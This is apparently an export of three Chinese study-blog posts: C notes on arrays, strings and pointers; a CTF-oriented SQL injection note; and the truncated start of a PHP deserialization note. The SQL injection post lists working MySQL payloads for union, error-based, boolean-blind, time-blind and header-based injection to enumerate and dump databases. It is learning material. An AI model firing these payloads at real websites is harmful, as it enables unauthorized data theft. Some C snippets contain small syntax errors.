<li><p>第三种：只给一部分赋值，其余自动初始化为0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 表示为前边 6 个元素赋值，后边 4 个元素系统自动初始化为 0</span></code></pre>
</li>
<li><p>第四种：可以只给出各个元素的值，而不指定数组的长度</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第五种：C99 增加了一种新特性——指定初始化的元素。这样就可以只对数组中的某些指定元素进行初始化赋值，而未被赋值的元素自动初始化为 0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 编译的时候记得加上–std=c99选项</span></code></pre>
</li>
</ul>
<hr>
<hr>
<h2 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a><strong>字符串处理函数</strong></h2><h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><ul>
<li>两种方式存放和表达字符串：1.字符串常量2.字符类型的数组</li>
<li>字符数组</li>
</ul>
<blockquote>
<p>可以先定义指定长度的字符数组，然后再给每个元素单独赋值：</p>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> main
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'e'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>

    ……
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>还可以直接在定义的时候对字符数组进行初始化，这样会方便很多：</p>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> main
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// 初始化字符数组的每个元素</span>
    <span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 可以不写元素的个数，因为编译器会自动计算</span>
    <span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 使用字符串常量初始化字符数组</span>
    <span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Nines"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 使用字符串常量初始化，可以省略大括号</span>
    <span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Nines"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<hr>
<h3 id="字符串处理函数-1"><a href="#字符串处理函数-1" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><ul>
<li>获取字符串的长度：strlen 函数</li>
</ul>
<p>拷贝字符串：strcpy 函数和 strncpy 函数</p>
<p>连接字符串：strcat 函数和 strncat 函数</p>
<p>比较字符串：strcmp 函数和 strncmp 函数</p>
<hr>
<hr>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a><strong>二维数组</strong></h2><h3 id="1-二维数组的定义"><a href="#1-二维数组的定义" class="headerlink" title="1.二维数组的定义"></a>1.二维数组的定义</h3><ul>
<li>定义二维数组的方法跟一维数组相似，使用方括号指定每个维度的元素个数：</li>
</ul>
<blockquote>
<p>类型 数组名[常量表达式][常量表达式]</p>
</blockquote>
<blockquote>
<p><font color="red">注意</font>：这里需要强调的是几行几列我们是从概念模型上来看的，也就是说，这样来看待二维数组，我们可以更容易理解。但从物理模型上看，无论是二维数组还是更多维的数组，在内存中仍然是以线性的方式存储的。</p>
</blockquote>
<h3 id="2-二维数组的访问"><a href="#2-二维数组的访问" class="headerlink" title="2.二维数组的访问"></a>2.二维数组的访问</h3><ul>
<li>数组名[下标]:<pre class=" language-c"><code class="language-c">a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问a数组中第1行第1列的元素</span>
b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问b数组中第2行第4列的元素</span></code></pre>
</li>
<li><font color="red">要防止数组越界</font></li>
</ul>
<h3 id="3-二维数组的初始化"><a href="#3-二维数组的初始化" class="headerlink" title="3.二维数组的初始化"></a>3.二维数组的初始化</h3><ul>
<li><p>由于二维数组在内存中是线性存放的，因此可以将数据写在一个花括号内</p>
</li>
<li><p>为了更直观地表示元素的分布，可以用大括号将每一行的元素括起来</p>
</li>
<li><p>二维数组也可以仅对部分元素赋初值</p>
</li>
<li><p>C99 同样增加了一种新特性：指定初始化的元素。这样就可以只对数组中的某些指定元素进行初始化赋值，而未被赋值的元素自动初始化为 0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>二维数组也可以让编译器根据元素的数量计算数组的长度。但只有第 1 维的元素个数可以不写，其他维度必须写上</p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a><strong>指针</strong></h2><h3 id="1-内存存放变量"><a href="#1-内存存放变量" class="headerlink" title="1.内存存放变量"></a>1.内存存放变量</h3><ul>
<li>通过变量名对变量进行访问和存储是为了方便程序员而设计的，其实在内存中完全没有存储变量名的必要。因为编译器知道具体每一个变量名对应的存放地址，所以当你读取某个变量的时候，编译器就会找到变量名所在的地址，并根据变量的类型读取相应范围的数据。</li>
</ul>
<h3 id="2-指针和指针变量"><a href="#2-指针和指针变量" class="headerlink" title="2.指针和指针变量"></a>2.指针和指针变量</h3><ul>
<li>通常我们所说的指针，就是地址的意思。C 语言中有专门的指针变量用于存放指针，跟普通变量不同，指针变量存储的是一个地址。</li>
<li>指针变量也有类型，它的类型就是存放的地址指向的数据类型。</li>
</ul>
<h3 id="3-定义指针变量"><a href="#3-定义指针变量" class="headerlink" title="3.定义指针变量"></a>3.定义指针变量</h3><ul>
<li>定义指针变量跟普通变量十分相似，只是中间多了一个星号（*）<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span></code></pre>
</li>
<li>左侧的数据类型表示指针变量中存放的地址指向的内存单元的数据类型</li>
</ul>
<h3 id="4-取地址运算符和取值运算符"><a href="#4-取地址运算符和取值运算符" class="headerlink" title="4.取地址运算符和取值运算符"></a>4.取地址运算符和取值运算符</h3><ul>
<li><p>如果需要获取某个变量的地址，可以使用取地址运算符（&amp;）</p>
</li>
<li><p>如果需要访问指针变量指向的数据，可以使用取值运算符（*）</p>
</li>
<li><p><font color="red">注意</font>：取值运算符跟定义指针用的都是星号（*），这属于符号的重用，在不同的地方有不同的意义：在定义时表示定义一个指针变量；在其他位置表示获取指针变量指向的变量的值</p>
</li>
<li><p><font color="red"><strong>避免访问未初始化指针</strong></font> </p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a><strong>指针和数组</strong></h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><ul>
<li>数组不是指针</li>
<li>数组名是数组第一个元素的地址，也是数组的首地址<h3 id="2-指向数组的指针："><a href="#2-指向数组的指针：" class="headerlink" title="2.指向数组的指针："></a>2.指向数组的指针：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
p <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 语句1</span>
p <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 语句2</span></code></pre>
<blockquote>
<p>因为数组名即数组第一个元素的地址，所以语句 1 和语句 2 是等价的，都是将数组 a 的首地址存放到指针变量 p 中。</p>
</blockquote>
</li>
</ul>
<h3 id="3-指针的运算"><a href="#3-指针的运算" class="headerlink" title="3.  指针的运算"></a>3.  指针的运算</h3><ul>
<li><p>当指针指向数组元素的时候，我们可以对指针变量进行加减运算，这样做的意义相当于指向距离指针所在位置向前或向后第 n 个元素。比如 p+1 表示指向 p 指针指向的元素的下一个元素；p-1 则表示指向上一个元素。</p>
</li>
<li><p><font color="red">注意</font>：p+1 并不是简单地将地址加1，而是指向数组的下一个元素</p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针数组和数组指针"><a href="#指针数组和数组指针" class="headerlink" title="指针数组和数组指针"></a><strong>指针数组和数组指针</strong></h2><h3 id="1-指针和数组的区别"><a href="#1-指针和数组的区别" class="headerlink" title="1. 指针和数组的区别"></a>1. 指针和数组的区别</h3><ul>
<li>指针是左值</li>
<li>而数组名只是一个地址常量，它不可以被修改，所以数组名不是左值。</li>
</ul>
<h3 id="2-指针数组"><a href="#2-指针数组" class="headerlink" title="2. 指针数组"></a>2. 指针数组</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>p1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><font color="blue">指针数组是一个数组，每个数组元素存放一个指针变量。</font></li>
</ul>
<h3 id="3-数组指针"><a href="#3-数组指针" class="headerlink" title="3.数组指针"></a>3.数组指针</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>p2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><font color="blue">数组指针是一个指针，它指向的是一个数组。</font></li>
</ul>
<hr>
<hr>
<h2 id="指针和二维数组"><a href="#指针和二维数组" class="headerlink" title="指针和二维数组"></a><strong>指针和二维数组</strong></h2><ul>
<li><p>在 C 语言中，二维数组的实现，只是简单地通过“线性扩展”的方式进行。</p>
</li>
<li><p>要用指针来指向二维数组，需要使用数组指针的形式。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="void指针和NULL指针"><a href="#void指针和NULL指针" class="headerlink" title="void指针和NULL指针"></a><strong>void指针和NULL指针</strong></h2><h3 id="1-void类型"><a href="#1-void类型" class="headerlink" title="1.void类型"></a>1.void类型</h3><ul>
<li>void 即的字面意思是“无类型”，定义变量的时候，我们通过类型来决定该变量所占的内存空间。</li>
</ul>
<h3 id="2-void指针"><a href="#2-void指针" class="headerlink" title="2.void指针"></a>2.void指针</h3><ul>
<li>void 指针我们把它称之为通用指针，就是可以指向任意类型的数据。也就是说，任何类型的指针都可以赋值给 void 指针。</li>
</ul>
<blockquote>
<p>不要直接对 void 指针进行解引用，因为编译器不知道它所指向的数据类型</p>
</blockquote>
<blockquote>
<p>使用 void 指针一定要小心，由于 void 指针可以包罗万象的特性，间接使得不同类型的指针转换变为合法</p>
</blockquote>
<h3 id="3-NULL指针"><a href="#3-NULL指针" class="headerlink" title="3.NULL指针"></a>3.NULL指针</h3><ul>
<li><p>如果一个指针不指向任何数据，我们就称之为空指针，用 NULL 表示。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> NULL ((void *)0)</span></code></pre>
</li>
<li><p>地址 0 通常是一个不被使用的地址。所以，如果一个指针指向 NULL，那么就意味着该指针不指向任何东西。</p>
</li>
<li><p><font color="red">当你还不清楚要将指针初始化为什么地址时，请将它初始化 NULL；在对指针进行解引用时，先检查该指针是否为 NULL。这种策略可以为你今后编写大型程序节省大量的调试时间。</font></p>
</li>
</ul>
]]></content>
      <categories>
        <category>C语言</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入学习</title>
    <url>/2020/05/28/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="SQL注入学习"><a href="#SQL注入学习" class="headerlink" title="SQL注入学习"></a>SQL注入学习</h1><p>对sql注入的知识和技巧进行记录</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>Sql注入攻击</strong>是通过将<strong>恶意的</strong>Sql查询或添加语句插入到对应的<strong>输入参数</strong>中，再在后台Sql服务器上解析执行执行的攻击。</p>
<hr>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a><font color="green">整数型注入</font></h3><p>参数是int类型的，后端调用时一般没加单引号如：<br><code>select * from xxx where id=1</code></p>
<ol>
<li>判断数据库列数</li>
</ol>
<pre><code>-1 order by x #
// 第n个数字报错时，列数为n-1</code></pre><ol start="2">
<li>查看数据库名;</li>
</ol>
<pre><code>-1 union select database(),2,3,...n-1 #</code></pre><ol start="3">
<li>查表名</li>
</ol>
<pre><code>-1 union select group_concat(table_name),2,3,...n-1 from information_schema.tables where table_schema=&#39;xxx&#39; #</code></pre><ol start="4">
<li>查字段名</li>
</ol>
<pre><code>-1 union select group_concat(column_name),2,3,...n-1 from information_schema.columns where table_name=&#39;xxx&#39; #</code></pre><ol start="5">
<li>查数据</li>
</ol>
<pre><code>-1 union select 字段名,2,3,...n-1 from 库名.表名</code></pre><hr>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a><font color="green">字符型注入</font></h3><p>参数是字符类型的，后端调用时有加上单引号<br>如：<br><code>select * from xxx where id=&#39;1&#39;</code></p>
<p>具体步骤和数字型大致相同，不过要在参数后面加个一个单引号闭合前面的单引号</p>
<p>比如查列数语句：</p>
<pre><code>-1&#39; order by x #
// 第n个数字报错时，列数为n-1</code></pre><p>其余步骤的语句都是要闭合单引号</p>
<hr>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><font color="green">报错注入</font></h3><p>SQL报错注入就是利用数据库的某些机制，人为的制造错误条件，使得查询结果能够出现在错误信息中。</p>
<p><strong>1. floor()报错注入</strong><br>Payload：</p>
<pre><code>1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></pre><p>分析payload中的函数：</p>
<ol>
<li>count(): 返回匹配指定条件的行数。count(*)则返回表中的记录数</li>
<li>floor(): 作用是向下取整，即去掉小数部分</li>
<li>rand(): 随机取(0,1)中的一个数，但是给它一个参数就不是随机了。floor(rand(0)*2)为序列0110110</li>
<li>concat(): 用于连接两个字符串</li>
<li>group by x: x相同于as x,设置一个别名</li>
<li>0x26: 16进制，转换字符为”&amp;”</li>
</ol>
<p><strong>爆错原因：</strong>count，rand()，group by三个连用会造成主键重复。因为floor(rand(0)*2)的重复性，导致group by语句出错</p>
<p>查数据库名：</p>
<pre><code>1 Union select count(*),concat((select databse()),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></pre><p><strong>2. Xpath语法报错</strong></p>
<ul>
<li><p>extractvalue()报错注入：<br>extractvalue的作用是负责在xml文档中按照xpath语法查询节点内容<br>Payload:<br><code>1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
</li>
<li><p>updatexml()报错注入：<br>updatexmlde的作用是负责修改查询到的内容<br>Payload:<br><code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
</li>
</ul>
<blockquote>
<p>这两种报错都有长度限制，最长32位</p>
</blockquote>
<p><strong>3. 数据溢出报错</strong></p>
<ol>
<li>利用 <strong>!</strong> 溢出报错<br>mysql中BIGINT类型的最大数为18446744073709551615<br>即~0（把0按位取反）。超过这个数则溢出<br>sql中，如果一个查询成功返回，则其返回值为0。!0=1</li>
</ol>
<p>Payload：<br><code>1&#39; union select (!(select * from (select user())x) - ~0),2,3--+</code></p>
<ol start="2">
<li>exp()报错注入<br>利用double 数值类型超出范围进行报错注入</li>
</ol>
<pre><code>    mysql&gt; select exp(709);
    +-----------------------+
    | exp(709)              |
    +-----------------------+
    | 8.218407461554972e307 |
    +-----------------------+
    1 row in set (0.00 sec)

    mysql&gt; select exp(710);
    ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre><p>Pyaload：<br><code>1&#39; union select (exp(~(select * FROM(SELECT USER())a))),2,3 --+</code></p>
<p><strong>3. 利用列名重复报错</strong><br>mysql列名重复会报错。我们使用name_const来制造列<br>Payload：<br><code>1&#39; union select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --</code></p>
<p>利用这个特性可以用join爆列名<br>Payload：</p>
<pre><code>mysql&gt; select *  from(select * from test a join test b)c;
ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
mysql&gt; select *  from(select * from test a join test b using(id))c;
ERROR 1060 (42S21): Duplicate column name &#39;name&#39;</code></pre><hr>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><font color="green">布尔盲注</font></h3><p>盲注就是不会根据你构造的SQL注入语句返回信息，而是通过其他方式判断</p>
<p><strong>布尔盲注</strong>：就是只会返回查询是否成功而返回True和Fales，不会返回查询到的信息。</p>
<ol>
<li><p>判断数据库长度：<br><code>1 and ((length(databse)))&gt;5 #</code><br>如果返回正确，则说明数据库长度大于5<br>返回错误，则说明数据库长度小于等于5</p>
</li>
<li><p>爆数据库名<br><code>1 and (ascii(substr(database(),1,1)))&gt;100 #</code><br>利用substr函数与ascii函数构造猜测数据库名ascii码的值的语句<br>假如数据库名第一个字母为s，则<br><code>1&#39; and (ascii(substr(database(),1,1)))=115 #</code><br>返回结果是True。以此可以继续猜测第二个第三个字母</p>
</li>
<li><p>爆表名<br><code>1 and (ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 #</code><br>以此可以爆破此表名和其他表</p>
</li>
<li><p>爆列名<br><code>1 and (ascii(substr(select column_name from information_schema.columns where table_name=&quot;xxx&quot; limit 0,1),1,1))&gt;100 #</code></p>
</li>
<li><p>爆数据<br><code>1 and (ascii(substr(select 列名 from 数据库名.表名),1,1))=100 #</code></p>
</li>
</ol>
<blockquote>
<p>手工布尔注入很耗时间，建议用工具或者写脚本跑</p>
</blockquote>
<p><strong>另一种布尔注入情况</strong><br>主要是查询和一般的不一样。一般的布尔盲注是数据库查询结果为空或者查询语句报错，才回显error</p>
<p>这种的情况是<strong>即使数据库查询为空，返回结果还是True</strong>，只有当查询语句报错才返回error</p>
<p>这个时候，用and加上布尔盲注语句就不起作用了。因为这是根据查询结果是否为空来判断的</p>
<p>所以这时候改用<strong>if语句</strong>来构造注入</p>
<blockquote>
<p>if(expr1,expr2,expr3)，如果expr1的值为true，则执行expr2语句，如果expr1的值为false，则执行expr3语句。</p>
</blockquote>
<p>因为mysql会对整个语句进行判断，所以让exp3为子查询语句</p>
<p>Payload：</p>
<pre><code>if(查询语句,1,(select table_name from information_schema.tables)) #</code></pre><p>爆数据库名：</p>
<pre><code>if(substr(database(),1,1)=&#39;s&#39;,1,(select table_name from information_schema.tables)) #</code></pre><p>其他步骤就是把查询语句换一下就行</p>
<hr>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><font color="green">时间盲注</font></h3><p><strong>时间盲注</strong>指通过<font color="red">页面执行的时间</font>来判断数据内容的注入方式，通常用于数据不会回显到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据</p>
<ol>
<li>判断注入点：<br><code>1 and sleep(10)</code><br>若页面响应时间延时10秒，则存在注入</li>
</ol>
<p>爆数据的时候一般和if连用</p>
<ol start="2">
<li><p>爆数据库名：<br><code>if(substr(databse(),1,1)=&#39;x&#39;,sleep(5),1) #</code><br>若页面延时则数据库名第一个字母为x</p>
</li>
<li><p>爆表名：<br><code>if(substr((select table_name from information_schema.tables where table_schema=&#39;xxx&#39; limit 0,1),1,1),sleep(5),1) #</code></p>
</li>
<li><p>爆列名：<br><code>if(substr((select column_name from information_schema.columns where table_name=&#39;xxx&#39; limit 0,1),1,1),sleep(5),1) #</code></p>
</li>
<li><p>爆数据：<br><code>if(substr((select 列名 from 数据库名.表名),1,1)=&#39;x&#39;,sleep(5),1) #</code></p>
</li>
</ol>
<hr>
<p><font color="green">Cookie、UA、Referer注入</font></p>
<p>这三种注入大同小异，都是不通过url传参，而是在url请求包里用Cookie或UA或Referer来传参</p>
<p>注入构造就是在请求包里的Cookie或UA或Referer构造语句</p>
<p>Cookie注入：<br>在请求包里添加：<br><code>Cookie：id=-1 union select database(),2 #</code></p>
<blockquote>
<p>其余两种一样做法</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Writeup</category>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化学习</title>
    <url>/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="PHP反序列化漏洞学习（一）"><a href="#PHP反序列化漏洞学习（一）" class="headerlink" title="PHP反序列化漏洞学习（一）"></a>PHP反序列化漏洞学习（一）</h1><h2 id="概念"><a href="#概念" class="headerlink" title=" 概念"></a><font color="green"> 概念</font></h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><ul>
<li><p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p>
</li>
<li><p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
</li>
</ul>
<p>测试代码如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$test1_ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test1_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span></code></pre>
<p>运行结果：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>此处的<code>O</code>代表存储的是对象（object）。<code>4</code>表示对象的名称有4个字符。<code>&quot;Test&quot;</code>表示对象的名称。<code>1</code>表示有一个值。<code>s</code>表示字符串，<code>4</code>表示字符串长度，<code>&quot;flag&quot;</code>表示定义的变量名称。<code>123</code>表示变量的值。</p>
<h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><ul>
<li><strong>unserialize()</strong> 函数用于将通过 <a href="https://www.runoob.com/php/php-serialize-function.html" target="_blank" rel="noopener">serialize() </a>函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</li>
</ul>
<p>测试代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$test1_ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test1_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

